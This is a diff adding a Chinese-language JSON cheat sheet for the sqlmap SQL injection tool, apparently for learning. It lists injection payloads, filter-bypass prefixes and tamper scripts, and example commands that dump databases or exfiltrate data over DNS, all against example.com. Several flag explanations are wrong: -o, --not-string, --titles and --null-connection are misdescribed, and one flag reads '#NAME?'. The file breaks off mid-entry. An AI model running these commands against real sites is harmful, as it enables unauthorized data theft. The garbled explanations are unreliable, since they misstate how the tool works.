@@ -1,0 +1,1188 @@
+[
+  {
+    "sheet": "SQL注入符号",
+    "flag": "",
+    "explain": "SQL注入符号是用于构建和执行SQL注入攻击的特殊字符或字符串。",
+    "examples": [
+      "OR '1'='1",
+      "OR 1\"=\"1",
+      "OR '1'='1' --",
+      "OR '1'='1' #",
+      "OR '1'='1' /*"
+    ],
+    "notes": []
+  },
+  {
+    "sheet": "常用命令",
+    "flag": "--batch",
+    "explain": "这些参数用于指定 HTTP 请求的方式和数据。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php\" --data=\"id=1&name=test\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php\" --method=POST --data=\"id=1&name=test\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php\" --cookie=\"session_id=abc123; user_id=1\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php\" --user-agent=\"Mozilla/5.0\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php\" --referer=\"http://example.com\""
+    ],
+    "notes": []
+  },
+  {
+    "sheet": "(测试)1.仅测参数",
+    "flag": "-p",
+    "explain": "我要进行测试的注入参数。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1&name=test&age=25\" -P id",
+      "测试注入 \"id\" 和 \"name\" 参数",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1&name=test&age=25\" -P id,name",
+      "sqlmap -u \"http://example.com/vulnerable_page.php\" --data \"id=1&name=test&age=25\" -P id"
+    ],
+    "notes": [
+      "在此URL的可注入参数为 id 。",
+      "这个命令告诉sqlmap只测试id参数，而忽略\"name\"和\"age\"参数。",
+      "命令会对 \"POST\" 请求中的 \"id\" 参数进行测试。"
+    ]
+  },
+  {
+    "sheet": "2.仅测范围",
+    "flag": "--headers=",
+    "explain": "此命令用于筛选参数已测是浅在的 SQL 注入漏洞。这个命令用来指定一个方式。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1&name=test&age=25&category=books&price=100\" --param-filter=\"id|name\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php\" --data \"id=1&name=test&age=25&category=books&price=100\" --param-filter=\"id|name\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1&name=test&age=25&category=books&price=100\" --param-filter=\"^cat|price\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1&name=test\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php\" --data \"id=1&name=test\""
+    ],
+    "notes": [
+      "如果你只想测试参数名包含id或name的参数，可以使用--param-filter选项并提供一个匹配这些参数的正则表达式",
+      "这个命令告诉sqlmap只测试参数名包含id或name的参数，而忽略其他参数。",
+      "命令会对POST请求中参数名包含id或name的参数进行测试。",
+      "这个命令会测试参数名以cat开头（如category）或包含price（如price）的参数。",
+      "在这个URL中，id和name参数是潜在的注入点。"
+    ]
+  },
+  {
+    "sheet": "3.跳过不像是动态的参数",
+    "flag": "--skip-static",
+    "explain": "",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?static_param=123&dynamic_param=456\" --skip-static",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?static_param=123&dynamic_param=456\" --skip-static --batch --level=3 --risk=2"
+    ],
+    "notes": [
+      "在这个示例中，sqlmap会自动检测并跳过static_param参数，而只测试dynamic_param参数是否存在SQL注入漏洞。",
+      "这个命令告诉sqlmap跳过静态参数，自动处理所有提示，不需要用户交互，同时将检测级别设置为3，风险级别设置为2。"
+    ]
+  },
+  {
+    "sheet": "4.忽略参数",
+    "flag": "--skip=",
+    "explain": "在sqlmap中，--skip选项用于指定不进行测试的参数。这个选项允许用户明确指定哪些参数应该被跳过，从而聚焦于更有可能存在漏洞的其他参数。",
+    "examples": [
+      "http://example.com/vulnerable_page.php?id=1&name=test&age=25&category=books&price=100",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1&name=test&age=25&category=books&price=100\" --skip=age,category",
+      "sqlmap -u \"http://example.com/vulnerable_page.php\" --data=\"id=1&name=test&age=25&category=books&price=100\" --skip=age,category",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1&name=test&age=25&category=books&price=100\" --skip=age,category --level=3 --risk=2"
+    ],
+    "notes": [
+      "在这个示例中，sqlmap会跳过age和category参数，而只测试id、name和price参数。",
+      "这个命令会对POST请求中的数据进行测试，但会跳过age和category参数。",
+      "这个命令告诉sqlmap跳过age和category参数，同时将检测级别设置为3，风险级别设置为2。"
+    ]
+  },
+  {
+    "sheet": "5.忽略参数(正则)",
+    "flag": "--param-exclude=",
+    "explain": "在sqlmap中，--param-exclude选项用于指定一个正则表达式，排除那些匹配该正则表达式的参数进行测试。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1&name=test&age=25&category=books&price=100\" --param-exclude=\"age|category\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php\" --data=\"id=1&name=test&age=25&category=books&price=100\" --param-exclude=\"age|category\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1&name=test&age=25&category=books&price=100\" --param-exclude=\"^cat|price\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1&name=test&age=25&category=books&price=100\" --param-exclude=\"age|category\" --level=3 --risk=2"
+    ],
+    "notes": [
+      "在这个示例中，sqlmap会跳过参数名中包含age和category的参数，而只测试id、name和price参数。",
+      "这个命令会对POST请求中的数据进行测试，但会跳过参数名中包含age和category的参数。",
+      "这个命令会跳过参数名以cat开头（如category）或包含price（如price）的参数",
+      "这个命令告诉sqlmap排除参数名中包含age和category的参数，同时将检测级别设置为3，风险级别设置为2。"
+    ]
+  },
+  {
+    "sheet": "6.payload前缀",
+    "flag": "--prefix",
+    "explain": "sqlmap中，--prefix选项用于在注入的SQL代码之前添加一个字符串。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --prefix=\"') AND ('1'='1\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --prefix=\"/*!50000\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --prefix=\"') AND ('1'='1\" --technique=E --level=3 --risk=2",
+      "sqlmap中，--prefix选项用于在注入的SQL代码之前添加一个字符串。"
+    ],
+    "notes": [
+      "在这个示例中，sqlmap在注入的SQL代码之前添加了') AND ('1'='1，这样可以改变注入点的上下文，有助于绕过某些防御机制。",
+      "在这个示例中，/*!50000 是MySQL中的一种特定注释语法，它用于绕过某些关键字过滤器。",
+      "这个命令告诉sqlmap在注入代码之前添加') AND ('1'='1，并使用布尔盲注入技术，检测级别设置为3，风险级别设置为2。"
+    ]
+  },
+  {
+    "sheet": "7.payload后缀",
+    "flag": "--suffix",
+    "explain": "在sqlmap中，--suffix选项用于在注入的SQL代码之后添加一个字符串。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --suffix=\"--\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --suffix=\"/*!50000*/\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --suffix=\"--\" --technique=E --level=3 --risk=2"
+    ],
+    "notes": [
+      "在这个示例中，sqlmap在注入的SQL代码之后添加了--，这样可以注释掉后续的SQL代码，有助于绕过某些防御机制。",
+      "在这个示例中，/*!50000*/ 是MySQL中的一种特定注释语法，它用于绕过某些关键字过滤器。",
+      "这个命令告诉sqlmap在注入代码之后添加--，并使用布尔盲注入技术，检测级别设置为3，风险级别设置为2"
+    ]
+  },
+  {
+    "sheet": "8.固定DBMS为",
+    "flag": "--dbms",
+    "explain": "在sqlmap中，--dbms选项用于显式指定目标数据库管理系统（DBMS）的类型。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --dbms=mysql",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --dbms=mysql --level=3 --risk=2 --technique=E",
+      "sqlmap支持多种数据库管理系统，包括但不限于：",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --dbms=oracle",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --dbms=postgresql"
+    ],
+    "notes": [
+      "指定读取 mysql 数据库",
+      "这个命令告诉sqlmap目标数据库是MySQL，并设置检测级别为3，风险级别为2，同时使用错误基于的注入技术。"
+    ]
+  },
+  {
+    "sheet": "9.DB认证",
+    "flag": "#NAME?",
+    "explain": "在sqlmap中，--dbms-cred选项用于指定数据库管理系统（DBMS）的认证凭证。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --dbms-cred=\"admin:password123\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --dbms=mysql --dbms-cred=\"root:secret\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --dbms=mysql --dbms-cred=\"root:secret\" --level=3 --risk=2 --technique=E"
+    ],
+    "notes": [
+      "在这个示例中，sqlmap将使用提供的用户名root和密码secret进行认证。",
+      "这个命令告诉sqlmap目标数据库是MySQL，并使用用户名root和密码secret进行认证，同时设置检测级别为3，风险级别为2，并使用错误基于的注入技术。"
+    ]
+  },
+  {
+    "sheet": "10.固定OS为",
+    "flag": "--os",
+    "explain": "在sqlmap中，--os选项用于显式指定目标系统的操作系统类型。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --os=Linux",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --os=Windows",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --os=Linux --level=3 --risk=2 --technique=E",
+      "sqlmap支持多种操作系统，包括但不限于："
+    ],
+    "notes": [
+      "这个命令告诉sqlmap目标操作系统是Linux，并设置检测级别为3，风险级别为2，同时使用错误基于的注入技术。",
+      "在这个示例中，sqlmap会针对Windows操作系统进行优化测试。"
+    ]
+  },
+  {
+    "sheet": "11.关闭数据库类型转换",
+    "flag": "--no-cast",
+    "explain": "在sqlmap中，--no-cast选项用于禁用数据类型转换。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --no-cast",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --no-cast --level=3 --risk=2 --technique=E"
+    ],
+    "notes": [
+      "在这个示例中，sqlmap将不会尝试进行数据类型转换。",
+      "这个命令告诉sqlmap禁用数据类型转换，并设置检测级别为3，风险级别为2，同时使用错误基于的注入技术。",
+      "在这个示例中，sqlmap不会尝试进行数据类型转换，从而确保注入尝试保持原始数据类型。"
+    ]
+  },
+  {
+    "sheet": "12.关闭string转义",
+    "flag": "--no-escape",
+    "explain": "在sqlmap中，--no-escape选项用于禁用对注入有效负载的转义处理。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --no-escape",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --no-escape --level=3 --risk=2 --technique=E"
+    ],
+    "notes": [
+      "在这个示例中，sqlmap将不会对注入负载进行转义处理。",
+      "这个命令告诉sqlmap禁用转义处理，并设置检测级别为3，风险级别为2，同时使用错误基于的注入技术。",
+      "在这个示例中，sqlmap不会对注入负载进行转义处理，从而确保注入尝试保持原始字符内容。"
+    ]
+  },
+  {
+    "sheet": "转义的意思",
+    "flag": "",
+    "explain": "在SQL注入测试中，转义（escaping）是指将某些特殊字符进行处理，以防止它们被解释为SQL语句的一部分。",
+    "examples": [
+      "SELECT * FROM users WHERE username = '$username';"
+    ],
+    "notes": [
+      "这将导致SQL注入攻击，因为查询条件永远为真。"
+    ]
+  },
+  {
+    "sheet": "13.使用大数",
+    "flag": "--invalid-bignum",
+    "explain": "在sqlmap中，--invalid-bignum选项用于将大整数（bignum）作为无效数据进行测试，以检测和利用SQL注入漏洞。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --invalid-bignum",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --invalid-bignum --level=3 --risk=2 --technique=E"
+    ],
+    "notes": [
+      "在这个示例中，sqlmap会尝试将非常大的整数插入到注入点，以测试目标数据库对大整数处理的响应。",
+      "这个命令告诉sqlmap使用大整数作为无效数据，并设置检测级别为3，风险级别为2，同时使用错误基于的注入技术。",
+      "在这个示例中，sqlmap会尝试使用非常大的整数作为注入负载，以测试目标数据库的响应。"
+    ]
+  },
+  {
+    "sheet": "大数的意思",
+    "flag": "--invalid-bignum",
+    "explain": "这些整数在数据库或编程语言中通常需要特殊的处理或数据类型来存储和计算。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --invalid-bignum",
+      "SELECT * FROM users WHERE id = 99999999999999999999999999999999999999;",
+      "sqlmap可能会尝试注入以下SQL查询",
+      "sqlmap中的--invalid-bignum选项提供了这种测试方式，使得注入测试更加全面和有效。"
+    ],
+    "notes": [
+      "在这个示例中，sqlmap将尝试使用非常大的整数作为注入负载，以测试目标数据库的响应。",
+      "如果数据库无法正确处理这个大整数，可能会返回错误信息或异常响应，从而帮助发现SQL注入漏洞。"
+    ]
+  },
+  {
+    "sheet": "14.使用布尔运算",
+    "flag": "--invalid-logical",
+    "explain": "--invalid-logical 参数适用于 SQLMap 支持的所有数据库类型，包括但不限于：",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --invalid-logical",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --invalid-logical --level=3 --risk=2 --technique=E"
+    ],
+    "notes": [
+      "在这个示例中，sqlmap会尝试将无效的逻辑条件插入到注入点，以测试目标数据库对逻辑错误的响应。",
+      "在这个示例中，sqlmap会尝试使用无效的逻辑条件（例如1=2）进行注入测试。",
+      "这个命令告诉sqlmap使用无效的逻辑条件进行测试，并设置检测级别为3，风险级别为2，同时使用错误基于的注入技术。"
+    ]
+  },
+  {
+    "sheet": "15.使用随机字串",
+    "flag": "--invalid-string",
+    "explain": "在sqlmap中，--invalid-string选项用于使用无效的字符串值进行SQL注入测试。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --invalid-string",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --invalid-string --level=3 --risk=2 --technique=E"
+    ],
+    "notes": [
+      "在这个示例中，sqlmap会尝试将无效的字符串插入到注入点，以测试目标数据库对无效字符串输入的响应。",
+      "在这个示例中，sqlmap会尝试使用无效字符串（例如多个单引号）进行注入测试。",
+      "这个命令告诉sqlmap使用无效字符串进行测试，并设置检测级别为3，风险级别为2，同时使用错误基于的注入技术。"
+    ]
+  },
+  {
+    "sheet": "16.tamper脚本",
+    "flag": "--tamper=???",
+    "explain": "在sqlmap中，tamper脚本是用于修改或伪装SQL注入负载以绕过某些防御机制的脚本。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --tamper=script1,script2",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --tamper=apostrophemask,space2comment",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --tamper=mytamper.py",
+      "sqlmap自带了一些常用的tamper脚本，位于tamper目录中。你可以查看该目录以了解可用的脚本，并选择合适的脚本进行测试。"
+    ],
+    "notes": [
+      "sqlmap自带了一些常用的tamper脚本，位于tamper目录中。你可以查看该目录以了解可用的脚本，并选择合适的脚本进行测试。",
+      "在这个示例中，sqlmap会将单引号替换为UTF-8编码，并将空格替换为注释，从而生成更难被检测到的SQL注入负载。"
+    ]
+  },
+  {
+    "sheet": "17.探索深度与风险(范围)",
+    "flag": "--risk",
+    "explain": "在sqlmap中，\"探索等级\"（level）和\"风险等级\"（risk）是两个重要的选项，用于控制SQL注入测试的广度和深度。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --level=3",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --risk=2",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --level=3 --risk=2"
+    ],
+    "notes": [
+      "这个命令将sqlmap的探索等级设置为3，使其测试更多的参数和请求。",
+      "这个命令将sqlmap的风险等级设置为2，使其使用中等风险的payload进行测试。",
+      "这个命令将sqlmap的探索等级设置为3，风险等级设置为2，使其进行更广泛和中等风险的测试。"
+    ]
+  },
+  {
+    "sheet": "18.指定True时的字符串",
+    "flag": "--string",
+    "explain": "在使用 SQLMap 进行 SQL 注入测试时，--string 命令行参数适用于各种类型的数据库。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --string=\"Welcome, admin\""
+    ],
+    "notes": [
+      "这个命令将告诉 SQLMap 在响应页面中搜索 \"Welcome, admin\" 字符串，如果找到该字符串，SQLMap 将确认注入成功。"
+    ]
+  },
+  {
+    "sheet": "19.指定False时的字符串",
+    "flag": "--not-string",
+    "explain": "SQLMap 的 --not-string 参数用于指定一个字符串，这个字符串在 SQL 查询的响应中应该不存在。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --not-string=\"InvalidQuery\""
+    ],
+    "notes": [
+      "这个命令会告诉 SQLMap 在生成的 SQL 注入 payload 中插入 InvalidQuery 字符串，以帮助判断查询是否有效。"
+    ]
+  },
+  {
+    "sheet": "20.指定正则",
+    "flag": "--regexp",
+    "explain": "在 SQLMap 中，--regexp 参数用于指定一个正则表达式，以匹配 SQL 注入测试的响应内容。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --regexp=\"Welcome\"",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --regexp=\"\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b\""
+    ],
+    "notes": [
+      "这个命令会告诉 SQLMap 使用正则表达式 Welcome 来检查响应内容。如果响应中包含 \"Welcome\"，SQLMap 将根据该信息进行处理。",
+      "这个命令会告诉 SQLMap 使用正则表达式来匹配 IP 地址模式（例如 192.168.1.1）的内容。"
+    ]
+  },
+  {
+    "sheet": "正则的意思",
+    "flag": "",
+    "explain": "它允许用户通过特定的模式匹配规则来搜索、匹配和操作文本。正则表达式广泛应用于文本处理、数据验证、搜索和替换等任务。",
+    "examples": [],
+    "notes": []
+  },
+  {
+    "sheet": "21.指定http状态码",
+    "flag": "--code=",
+    "explain": "在 SQLMap 中，--code 参数用于指定 HTTP 响应代码（状态码），以帮助确认 SQL 注入测试是否成功或验证测试响应是否符合预期。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --code=200",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --code=200,500"
+    ],
+    "notes": [
+      "这个命令会告诉 SQLMap 仅在响应状态码为 200 时进行进一步的注入测试或处理。",
+      "这个命令会让 SQLMap 处理 HTTP 响应状态码为 200 或 500 的响应。"
+    ]
+  },
+  {
+    "sheet": "如何取得状态码",
+    "flag": "--head",
+    "explain": "现代 Web 浏览器（如 Chrome、Firefox、Edge）内置了开发者工具，可以轻松查看 HTTP 响应状态码。",
+    "examples": [
+      "curl -I \"http://example.com/vulnerable.php?id=1\"",
+      "wget --server-response \"http://example.com/vulnerable.php?id=1\" -O /dev/null",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\""
+    ],
+    "notes": [
+      "这个命令会显示响应头，其中包括状态码，例如 HTTP/1.1 200 OK。",
+      "这个命令会显示响应头，其中包括状态码。",
+      "在 SQLMap 的输出中，你可以看到 HTTP 请求和响应的详细信息，包括状态码。"
+    ]
+  },
+  {
+    "sheet": "22.仅对比文本",
+    "flag": "--text-only",
+    "explain": "在 SQLMap 中，--text-only 参数用于仅提取和显示 HTTP 响应的文本内容，而不显示其他信息，如 HTTP 头部或状态码。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --text-only",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --text-only --dump"
+    ],
+    "notes": [
+      "这个命令会告诉 SQLMap 仅显示 HTTP 响应的文本内容，而不包括 HTTP 头部和状态码。",
+      "这个命令将显示响应的文本内容，同时进行数据导出。"
+    ]
+  },
+  {
+    "sheet": "23.仅对比title",
+    "flag": "--titles",
+    "explain": "在 SQLMap 中，--titles 参数用于在进行 SQL 注入测试时提取和显示数据库表或列的标题。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --titles",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --tables --titles"
+    ],
+    "notes": []
+  },
+  {
+    "sheet": "24.寻找明显目标并测试",
+    "flag": "--smart",
+    "explain": "--smart 参数适用于 SQLMap 支持的所有数据库类型，包括但不限于：",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --smart",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --smart --dbs"
+    ],
+    "notes": [
+      "这个命令会启动智能注入模式，SQLMap 将尝试不同的注入方法以找到最适合目标的方式。",
+      "这个命令会启用智能模式并尝试列出数据库中的所有数据库。"
+    ]
+  },
+  {
+    "sheet": "25.注入技术",
+    "flag": "--technique= ?",
+    "explain": "在 SQLMap 中，--technique 参数用于指定要使用的 SQL 注入技术。SQLMap 支持多种注入技术，允许用户选择最合适的技术来测试目标应用程序。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --technique=U",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --technique=US",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\""
+    ],
+    "notes": [
+      "这个命令会告知 SQLMap 只使用 Union 注入技术进行测试。",
+      "这个命令会告知 SQLMap 使用 Union 和 Boolean-based 注入技术进行测试。",
+      "这个命令会默认使用所有支持的技术进行测试。"
+    ]
+  },
+  {
+    "sheet": "26.指定DB延迟几秒响应",
+    "flag": "--time-sec=默认5秒",
+    "explain": "在 SQLMap 中，--time-sec 参数用于指定在使用时间延迟注入（Time-Based Injection）时的延迟时间。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --technique=T --time-sec=5",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --technique=T --time-sec=2 --risk=3"
+    ],
+    "notes": [
+      "这个命令会告知 SQLMap 在执行时间延迟注入时，使用 5 秒的延迟时间。",
+      "这个命令会使用 2 秒的延迟时间进行时间延迟注入，同时设置风险等级为 3。"
+    ]
+  },
+  {
+    "sheet": "27.指定最大union列数",
+    "flag": "--union-cols=默认10列",
+    "explain": "\" --union-cols=默认10列 \"",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --technique=U --union-cols=3",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --technique=U --union-cols=4 --dump"
+    ],
+    "notes": [
+      "这个命令会告诉 SQLMap 在进行 Union-Based SQL 注入测试时使用 3 列。",
+      "这个命令会使用 4 列进行 Union-Based SQL 注入测试，并尝试提取数据。"
+    ]
+  },
+  {
+    "sheet": "28.指定枚举列数时所用字符",
+    "flag": "--union-char",
+    "explain": "--union-char 参数适用于 SQLMap 支持的所有数据库类型，包括但不限于：",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --technique=U --union-char=5",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --technique=U --union-cols=4 --union-char=10"
+    ],
+    "notes": [
+      "这个命令会告诉 SQLMap 在进行 Union-Based SQL 注入测试时，使用 5 个字符的测试条件。",
+      "这个命令会使用 4 列和每列 10 个字符的条件进行 Union-Based SQL 注入测试。"
+    ]
+  },
+  {
+    "sheet": "29.指定梅举列数时from的表名",
+    "flag": "--union-from",
+    "explain": "在 SQLMap 中，--union-from 参数用于指定 Union-Based SQL 注入中的 FROM 子句。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --technique=U --union-from=users",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --technique=U --union-cols=3 --union-char=10 --union-from=products"
+    ],
+    "notes": [
+      "这个命令会告诉 SQLMap 在进行 Union-Based SQL 注入测试时，使用 users 表作为数据来源。",
+      "这个命令会使用 3 列和每列 10 个字符的条件进行 Union-Based SQL 注入测试，并从 products 表中提取数据。"
+    ]
+  },
+  {
+    "sheet": "30.指定DNS",
+    "flag": "--dns-domain=",
+    "explain": "在 SQLMap 中，--dns-domain 参数用于进行 DNS exfiltration（DNS 外泄），",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --dns-domain=example.com",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --technique=U --dns-domain=example.com"
+    ],
+    "notes": [
+      "这个命令会告诉 SQLMap 将提取的数据通过 DNS 查询发送到 example.com 域名。",
+      "这个命令会使用 Union-Based SQL 注入技术进行测试，并将提取的数据通过 DNS 查询发送到 example.com 域名。"
+    ]
+  },
+  {
+    "sheet": "31.指定二街响应的url",
+    "flag": "--second-url=",
+    "explain": "在 SQLMap 中，--second-url 参数用于指定一个备用 URL，该 URL 将用于进行额外的测试请求。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --second-url=\"http://example.com/extra\"",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --data=\"username=admin&password=pass\" --second-url=\"http://example.com/extra\""
+    ],
+    "notes": [
+      "这个命令会告知 SQLMap 在进行注入测试时，也向 http://example.com/extra 发送请求。",
+      "这个命令会使用 POST 数据进行测试，并向 http://example.com/extra 发送额外的请求。"
+    ]
+  },
+  {
+    "sheet": "32.使用含二阶HTTP请求的文件",
+    "flag": "--second-req=",
+    "explain": "在 SQLMap 中，--second-req 参数用于指定一个附加的 HTTP 请求，这个请求会在主请求之后进行。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --second-req=\"GET /extra HTTP/1.1\\r\\nHost: example.com\\r\\n\"",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --second-req=\"@request.txt\"",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --second-req=\"GET /status HTTP/1.1\\r\\nHost: example.com\\r\\n\"",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --second-req=\"@second-request.txt\""
+    ],
+    "notes": [
+      "这个命令会在主请求后发送一个 GET 请求到 http://example.com/extra。",
+      "在这种情况下，request.txt 文件应包含完整的 HTTP 请求数据（例如，GET、POST 请求等）。",
+      "这个命令会在执行主请求之后，发送一个 GET 请求到 /status 端点。",
+      "这个命令会在执行主请求后，发送文件中定义的 POST 请求。"
+    ]
+  },
+  {
+    "sheet": "33.启动所有优化选项",
+    "flag": "-o",
+    "explain": "在 SQLMap 中，--keep-alive、--null-connection 和 --threads",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" -o output.txt",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --dump -o results.txt",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --keep-alive",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --null-connection",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --threads=3"
+    ],
+    "notes": [
+      "这个命令会将 SQLMap 的输出结果保存到 output.txt 文件中。",
+      "这个命令会执行数据提取操作（使用 --dump 参数），并将结果保存到 results.txt 文件中。"
+    ]
+  },
+  {
+    "sheet": "34.预测通常的查询结果",
+    "flag": "--predict-output",
+    "explain": "在 SQLMap 中，--predict-output 参数用于启用预测输出模式，该模式允许 SQLMap 在数据提取过程中根据已知的信息预测可能的输出。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --predict-output"
+    ],
+    "notes": [
+      "这个命令会启用预测输出模式，帮助 SQLMap 更准确地处理查询结果。"
+    ]
+  },
+  {
+    "sheet": "35.http连接使用keep-alive",
+    "flag": "--keep-alive",
+    "explain": "\"--keep-alive\" 参数与所有 SQLMap 支持的数据库类型兼容，",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --keep-alive",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --keep-alive --dump"
+    ],
+    "notes": [
+      "这个命令会启用 HTTP 持久连接，使得在测试过程中能够使用同一个连接发送多个请求，减少连接建立和关闭的开销。",
+      "这个命令会启用 Keep-Alive，并执行数据提取（使用 --dump 参数），在提取数据过程中提高请求的效率。"
+    ]
+  },
+  {
+    "sheet": "36.只比较响应大小报头，不获取响应主体",
+    "flag": "--null-connection",
+    "explain": "--null-connection 参数适用于 SQLMap 支持的所有数据库类型，包括：",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --null-connection",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --null-connection --dump"
+    ],
+    "notes": [
+      "这个命令会在进行测试时发送一个空的 HTTP 请求，用于观察目标应用对空请求的处理方式。",
+      "这个命令会发送空请求，并尝试提取数据（使用 --dump 参数）。"
+    ]
+  },
+  {
+    "sheet": "37.精准检测DB等版本信息",
+    "flag": "--fingerprint",
+    "explain": "\"--fingerprint\" 参数适用于 SQLMap 支持的所有数据库类型",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --fingerprint --dump"
+    ],
+    "notes": [
+      "这个命令会识别目标数据库类型，并在识别后执行数据提取操作（使用 --dump 参数）。"
+    ]
+  },
+  {
+    "sheet": "38.想应使用hex转换",
+    "flag": "--hex",
+    "explain": "\"--hex\" 参数与 SQLMap 支持的所有数据库类型兼容，",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --dump --hex",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --tables --hex"
+    ],
+    "notes": [
+      "这个命令会提取数据库中的数据（使用 --dump 参数），并将数据以十六进制格式显示。这对于分析包含特殊字符或二进制数据的内容非常有用。",
